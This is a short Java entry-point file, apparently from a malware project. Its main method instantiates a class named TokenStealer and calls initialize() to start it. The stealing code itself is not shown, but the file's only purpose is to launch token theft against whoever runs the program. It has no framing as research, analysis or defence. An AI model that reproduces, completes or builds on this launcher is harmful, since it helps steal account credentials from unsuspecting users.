package io.github.itzgonza;

import io.github.itzgonza.impl.TokenStealer;

public class Start {

	public static void main(String[] argument) throws Exception {
		if (TokenStealer.instance == null)
		    TokenStealer.instance = new TokenStealer();
		TokenStealer.instance.initialize();
	}
	
}